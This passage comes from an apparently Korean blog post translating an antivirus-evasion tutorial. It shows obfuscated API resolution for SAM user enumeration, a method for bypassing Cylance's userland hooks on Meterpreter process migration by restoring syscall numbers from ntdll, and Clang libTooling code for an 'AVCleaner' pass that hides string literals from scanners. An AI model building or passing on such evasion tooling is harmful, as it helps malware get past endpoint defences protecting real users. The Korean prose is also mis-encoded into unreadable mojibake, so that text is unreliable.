class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_SamEnu_BZxlW5ZBUAAe[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-number">0</span>&#125;;HANDLE hhid_SAMLIB_BZUriyLrlgrJ = LoadLibrary(hid_SAMLIB_01zmejmkLCHt);_SamEnumerateUsersInDomain ffSamEnumerateUsersInDoma =(_SamEnumerateUsersInDomain)GetProcAddress(hhid_SAMLIB_BZUriyLrlgrJ, hid_SamEnu_BZxlW5ZBUAAe);enumStatus = ffSamEnumerateUsersInDoma(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourned);</code></pre><h2 id="syscall-ì¬ì‘ì„±"><a href="#syscall-ì¬ì‘ì„±" class="headerlink" title="syscall ì¬ì‘ì„±"></a>syscall ì¬ì‘ì„±</h2><p>Cylanceê°€ ì‹¤í–‰ ì¤‘ì¸ ì»´í“¨í„°ì—ì„œ Meterpreterì˜ <em>migrate</em>ë¥¼ ì‚¬ìš©í•˜ë©´ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ íƒì§€ê°€ ì‹¤í–‰ëœë‹¤. CylanceëŠ” userland hookìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ ì¸ì ì…˜ì„ íƒì§€í•œë‹¤. íƒì§€ë¥¼ ìš°íšŒí•˜ë ¤ë©´ hookì„ ì œê±°í•˜ëŠ” ê²ƒìœ¼ë¡œ ê°„ë‹¨íˆ ìš°íšŒí•  ìˆ˜ ìˆë‹¤. ntdllì„ ì½ì€ í›„ syscall ë²ˆí˜¸ë¥¼ ë³µêµ¬í•˜ê³  ready-to-call shellcodeì— ì‚½ì…í•˜ëŠ” ê²ƒì€ ê°„ë‹¨í•˜ê³  userland hookì„ íš¨ê³¼ì ìœ¼ë¡œ ìš°íšŒí•œë‹¤. í•„ìëŠ” ì§€ê¸ˆê¹Œì§€ NTDLL.DLLì„ ì•…ì„± íŒŒì¼ë¡œ íŒë‹¨í•˜ëŠ” ê²ƒì„ ë³´ì§€ ëª»í–ˆë‹¤.</p><h1 id="êµ¬í˜„"><a href="#êµ¬í˜„" class="headerlink" title="êµ¬í˜„"></a>êµ¬í˜„</h1><p>ì•ì„œ ë§í•œ ëª¨ë“  ì•„ì´ë””ì–´ë“¤ì€ <em>libTooling</em>ì„ ê¸°ë°˜ìœ¼ë¡œ í•œ source code refactoring toolì—ì„œ êµ¬í˜„í•  ìˆ˜ ìˆë‹¤. ì´ ë¶€ë¶„ì€ <em>libTooling</em> ë¬¸ì„œê°€ ë¶€ì¡±í•´ì„œ í•„ìì˜ íŒ€ì—ì„œ ê°€ëŠ¥í•œ ì‹œê°„ ë™ì•ˆ í•œ ê²ƒì„ ë¬¸ì„œí™”í–ˆë‹¤. ë”°ë¼ì„œ ê°œì„ ì˜ ì—¬ì§€ê°€ ìˆìœ¼ë©° ë¬´ì–¸ê°€ ëˆˆì— ë„ëŠ” ê²½ìš° í•„ìëŠ” ê·¸ê²ƒì— ëŒ€í•´ ë“£ê³  ì‹¶ë‹¤.</p><h2 id="ì¶”ìƒ-êµ¬ë¬¸-íŠ¸ë¦¬-101"><a href="#ì¶”ìƒ-êµ¬ë¬¸-íŠ¸ë¦¬-101" class="headerlink" title="ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ 101"></a>ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ 101</h2><p>ì»´íŒŒì¼ëŸ¬ëŠ” ë³´í†µ ì—¬ëŸ¬ êµ¬ì„± ìš”ì†Œë¡œ êµ¬ì„±ë˜ëŠ”ë° ì¼ë°˜ì ìœ¼ë¡œ <em>Parser</em>ì™€ <em>Lexer</em>ë¡œ êµ¬ì„±ëœë‹¤. ì†ŒìŠ¤ ì½”ë“œê°€ ì»´íŒŒì¼ëŸ¬ì— ë“¤ì–´ê°€ë©´ ë¨¼ì € í”„ë¡œê·¸ë˜ë¨¸ê°€ ì‘ì„±í•œ ì›ë³¸ ì†ŒìŠ¤ ì½”ë“œì—ì„œ Parse Treeë¥¼ ìƒì„±í•˜ê³  ì»´íŒŒì¼ëŸ¬ê°€ í•„ìš”ë¡œ í•˜ëŠ” ë…¸ë“œì— semantic informationì„ ì¶”ê°€í•œë‹¤. ì´ ê²°ê³¼ë¥¼ <em>Abstract Syntax Tree</em>(ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬)ë¼ê³  ë¶€ë¥¸ë‹¤. ë‹¤ìŒì€ ìœ„í‚¤í”¼ë””ì•„ì˜ ì˜ˆì‹œì´ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> b â‰  <span class="hljs-number">0</span>  <span class="hljs-keyword">if</span> a &gt; b    a := a âˆ’ b  <span class="hljs-keyword">else</span>    b := b âˆ’ a<span class="hljs-keyword">return</span> a</code></pre><p>ê°„ë‹¨í•œ í”„ë¡œê·¸ë¨ì˜ ì¼ë°˜ì ì¸ ASTëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/2.png"></p><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ ì˜ˆì‹œ</a></p><p>ì´ ë°ì´í„° êµ¬ì¡°ëŠ” ë‹¤ë¥¸ í”„ë¡œê·¸ë¨ì˜ propertyë¥¼ ì´í•´í•˜ëŠ” í”„ë¡œê·¸ë¨ì„ ì‘ì„±í•  ë•Œ ì •ë°€í•œ ì•Œê³ ë¦¬ì¦˜ì„ ì œê³µí•˜ë¯€ë¡œ ëŒ€ê·œëª¨ ì½”ë“œ refactoringì— ì í•©í•˜ë‹¤.</p><h3 id="Clangâ€™s-Abstract-Syntax-Tree"><a href="#Clangâ€™s-Abstract-Syntax-Tree" class="headerlink" title="Clangâ€™s Abstract Syntax Tree"></a>Clangâ€™s Abstract Syntax Tree</h3><p>The Right Wayì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³€ê²½í•´ì•¼ í•˜ë¯€ë¡œ Clangì˜ ASTì— ëŒ€í•´ ì•Œì•„ì•¼ í•œë‹¤. Clagnì€ AST ë¤í”„ë¥¼ command-line switchì— ì˜ˆì˜ê²Œ í‘œì‹œí•˜ì§€ë§Œ ì»´íŒŒì¼ëŸ¬ í”Œë˜ê·¸ ì„¤ì •ì´ ê¹Œë‹¤ë¡­ë‹¤.</p><p>ê°„ë‹¨í•œ í…ŒìŠ¤íŠ¸ translation unitì„ ë§Œë“¤ì–´ë³´ì.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI *f_NtMapViewOfSection)</span><span class="hljs-params">(HANDLE, HANDLE, PVOID *, ULONG, ULONG,</span></span><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER, PULONG, ULONG, ULONG, ULONG)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    f_NtMapViewOfSection lNtMapViewOfSection;    HMODULE ntdll;    <span class="hljs-keyword">if</span> (!(ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))))    &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, <span class="hljs-string">&quot;NtMapViewOfSection&quot;</span>);    lNtMapViewOfSection(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ê·¸ë¦¬ê³  ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ <code>.sh</code> íŒŒì¼ì— ì‘ì„±í•´ë¼</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/headers/winsdk&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>#<span class="hljs-string">&quot;/usr/lib/clang/8.0.1/&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><p><code>WIN_INCLUDE</code>ëŠ” Win32 APIì™€ interact í•˜ê¸° ìœ„í•´ í•„ìš”í•œ í—¤ë”ë“¤ì´ ìˆëŠ” í´ë”ì´ë‹¤. ìœˆë„ìš°10ì—ì„œ ê°€ì ¸ì™”ìœ¼ë©° MinGWì—ì„œ ê°€ì ¸ì˜¤ì§€ ë§ê³  í•„ìì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ í•˜ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤. ê·¸ í›„ í…ŒìŠ¤íŠ¸ C íŒŒì¼ì„ ì¸ìë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ 18MB íŒŒì¼ì´ ìƒì„±ë˜ì§€ë§Œ <code>NtMapViewOfSection</code> ê°™ì€ ìš°ë¦¬ê°€ ì„ ì–¸í•œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ê²€ìƒ‰í•´ì„œ ASTì—ì„œ ë´ì•¼ í•  ë¶€ë¶„ìœ¼ë¡œ ì´ë™í•  ìˆ˜ ìˆë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/3.png"></p><p>ASTë¥¼ ì‹œê°í™”í–ˆìœ¼ë¯€ë¡œ ì–´ë–»ê²Œ ë…¸ë“œë¥¼ ì—…ë°ì´íŠ¸í•´ì•¼ ì†ŒìŠ¤ ì½”ë“œì˜ syntax ì˜¤ë¥˜ê°€ ì—†ì„ì§€ ì•Œ ìˆ˜ ìˆë‹¤. ë’·ë¶€ë¶„ì€ <em>libTooling</em>ì„ í†µí•œ AST manipulation êµ¬í˜„ì— ëŒ€í•´ì„œ ìƒì„¸íˆ ë‹¤ë£¬ë‹¤.</p><h3 id="ClangTool-boilerplate"><a href="#ClangTool-boilerplate" class="headerlink" title="ClangTool boilerplate"></a>ClangTool boilerplate</h3><p>êµ¬í˜„ì„ í•˜ê¸° ì „ì— boilerplate ì½”ë“œê°€ í•„ìš”í•˜ë¯€ë¡œ ë‹¤ìŒ ì½”ë“œë¥¼ <code>main.cpp</code>ì— ì…ë ¥í•´ë¼.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-comment">// LLVM includes</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Consumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/IncludeStyle.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/HeaderIncludes.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sstream&gt;</span></span><span class="hljs-keyword">namespace</span> ClSetup &#123;    llvm::<span class="hljs-function">cl::OptionCategory <span class="hljs-title">ToolCategory</span><span class="hljs-params">(<span class="hljs-string">&quot;StringEncryptor&quot;</span>)</span></span>;&#125;<span class="hljs-keyword">namespace</span> StringEncryptor &#123;    clang::Rewriter ASTRewriter;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> :</span> <span class="hljs-keyword">public</span> clang::ASTFrontendAction &#123;    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> ASTConsumerPointer = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;clang::ASTConsumer&gt;;        <span class="hljs-function">ASTConsumerPointer <span class="hljs-title">CreateASTConsumer</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler,</span></span><span class="hljs-function"><span class="hljs-params">                                             llvm::StringRef Filename)</span> <span class="hljs-keyword">override</span> </span>&#123;            ASTRewriter.setSourceMgr(Compiler.getSourceManager(), Compiler.getLangOpts());            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;ASTConsumer*&gt; consumers;            consumers.push_back(&amp;StringConsumer);              <span class="hljs-comment">// several passes can be combined together by adding them to `consumers`</span>            <span class="hljs-keyword">auto</span> TheConsumer = llvm::make_unique&lt;Consumer&gt;();            TheConsumer-&gt;consumers = consumers;            <span class="hljs-keyword">return</span> TheConsumer;        &#125;        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">BeginSourceFileAction</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler)</span> <span class="hljs-keyword">override</span> </span>&#123;            llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Processing file &quot;</span> &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EndSourceFileAction</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>&#123;            clang::SourceManager &amp;SM = ASTRewriter.getSourceMgr();            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> FileName = SM.getFileEntryForID(SM.getMainFileID())-&gt;getName();            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;** EndSourceFileAction for: &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;            <span class="hljs-comment">// Now emit the rewritten buffer.</span>            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;Here is the edited source file :\n\n&quot;</span>;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeS;            <span class="hljs-function">llvm::raw_string_ostream <span class="hljs-title">s</span><span class="hljs-params">(TypeS)</span></span>;            <span class="hljs-keyword">auto</span> FileID = SM.getMainFileID();            <span class="hljs-keyword">auto</span> ReWriteBuffer = ASTRewriter.getRewriteBufferFor(FileID);            <span class="hljs-keyword">if</span>(ReWriteBuffer != <span class="hljs-literal">nullptr</span>)                ReWriteBuffer-&gt;write((s));            <span class="hljs-keyword">else</span>&#123;                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;File was not modified\n&quot;</span>;                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> result = s.str();            <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fo</span><span class="hljs-params">(FileName)</span></span>;                   <span class="hljs-keyword">if</span>(fo.is_open())                fo &lt;&lt; result;            <span class="hljs-keyword">else</span>                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;[!] Error saving result to &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        &#125;    &#125;;&#125;auto main(int argc, const char *argv[]) -&gt; int &#123;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::tooling;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> ClSetup;    <span class="hljs-function">CommonOptionsParser <span class="hljs-title">OptionsParser</span><span class="hljs-params">(argc, argv, ToolCategory)</span></span>;    <span class="hljs-function">ClangTool <span class="hljs-title">Tool</span><span class="hljs-params">(OptionsParser.getCompilations(),</span></span><span class="hljs-function"><span class="hljs-params">                   OptionsParser.getSourcePathList())</span></span>;    <span class="hljs-keyword">auto</span> Action = newFrontendActionFactory&lt;StringEncryptor::Action&gt;();    <span class="hljs-keyword">return</span> Tool.run(Action.get());&#125;</code></pre><p>ì´ boilerplate ì½”ë“œëŠ” ê³µì‹ ë¬¸ì„œì—ì„œ ê°€ì ¸ì™€ì„œ ì„¤ëª…í•˜ì§€ ì•ŠëŠ”ë‹¤. ì–¸ê¸‰í• ë§Œí•œ ë³€ê²½ì ì€ <code>CreateASTConsumer</code>ì´ë‹¤. ìš°ë¦¬ì˜ ëª©í‘œëŠ” ê°™ì€ translation unitì—ì„œ ì—¬ëŸ¬ transformation passë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì´ë‹¤. consumers collection(í•„ìˆ˜ line: <code>consumer.push_back(&amp;...);</code>)ì— í•­ëª©ë“¤ì„ ì¶”ê°€í•˜ë©´ ëœë‹¤.</p><h2 id="ë¬¸ìì—´-ë‚œë…í™”-1"><a href="#ë¬¸ìì—´-ë‚œë…í™”-1" class="headerlink" title="ë¬¸ìì—´ ë‚œë…í™”"></a>ë¬¸ìì—´ ë‚œë…í™”</h2><p>ì´ ë¶€ë¶„ì—ì„œëŠ” ì„¸ ê°€ì§€ ë‹¨ê³„ë¡œ êµ¬ì„±ëœ ë¬¸ìì—´ ë‚œë…í™” íŒ¨ìŠ¤ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ êµ¬í˜„ ì„¸ë¶€ ì‚¬í•­ì„ ì„¤ëª…í•œë‹¤.</p><ul><li>ì†ŒìŠ¤ ì½”ë“œì— ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ì°¾ëŠ”ë‹¤.</li><li>ê·¸ê²ƒë“¤ì„ ë³€ìˆ˜ë¡œ ë³€í™˜í•œë‹¤.</li><li>ì ì ˆí•œ ìœ„ì¹˜(í•¨ìˆ˜ ë˜ëŠ” ì „ì—­ context í¬í•¨)ì— ë³€ìˆ˜ ì •ì˜/í• ë‹¹ì„ ì‚½ì…</li></ul><h3 id="ì†ŒìŠ¤-ì½”ë“œì—ì„œ-ë¬¸ìì—´-ë¦¬í„°ëŸ´-ì°¾ê¸°"><a href="#ì†ŒìŠ¤-ì½”ë“œì—ì„œ-ë¬¸ìì—´-ë¦¬í„°ëŸ´-ì°¾ê¸°" class="headerlink" title="ì†ŒìŠ¤ ì½”ë“œì—ì„œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ ì°¾ê¸°"></a>ì†ŒìŠ¤ ì½”ë“œì—ì„œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ ì°¾ê¸°</h3><p><code>StringConsumer</code>ëŠ” ì•„ë˜ì™€ ê°™ì´ ì •ì˜ë  ìˆ˜ ìˆë‹¤.(<code>StringEncryptor</code> namespaceì˜ ì•ë¶€ë¶„)</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringEncryptionConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> StringEncryptor;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[StringEncryption] Registering ASTMatcher...\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">MatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = stringLiteral().bind(<span class="hljs-string">&quot;decl&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;&#125;;StringEncryptionConsumer StringConsumer = StringEncryptionConsumer();</code></pre><p>translation unitì´ ìˆìœ¼ë©´ Clangì´ ASTì—ì„œ íŒ¨í„´ì„ ì°¾ì„ ìˆ˜ ìˆê³  ì°¾ì„ ë•Œë§ˆë‹¤ í˜¸ì¶œë  í•¸ë“¤ëŸ¬ë¥¼ ë“±ë¡í•  ìˆ˜ ìˆë‹¤. <a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>ëŠ” ê°•ë ¥í•œ íŒ¨í„´ ë§¤ì¹­ì„ ì§€ì›í•˜ì§€ë§Œ ì—¬ê¸°ì„œëŠ” ë¬¸ìì—´ ë¦¬í„°ëŸ´ë§Œ ì°¾ìœ¼ë¯€ë¡œ ì¶©ë¶„íˆ í™œìš©ë˜ì§€ ì•ŠëŠ”ë‹¤.</p><p>ìš°ë¦¬ëŠ” <code>MatchHandler</code>ë¥¼ êµ¬í˜„í•˜ì—¬ ë¬¸ì œì˜ í•µì‹¬ì„ íŒŒì•…í•  ìˆ˜ ìˆê³  <code>MatchResult</code> instanceë¥¼ ì–»ì„ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤. <code>MatchResult</code>ëŠ” ì‹ë³„ëœ AST ë…¸ë“œì— ëŒ€í•œ ì°¸ì¡°ì™€ ì¤‘ìš”í•œ context ì •ë³´ë¥¼ í¬í•¨í•œë‹¤.</p><p>í´ë˜ìŠ¤ë¥¼ ì •ì˜í•˜ì—¬ <code>clang::ast_matchers::MatchFinder::MatchCallback</code>ìœ¼ë¡œë¶€í„° ì¢‹ì€ stuffë¥¼ ìƒì†ë°›ì.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span 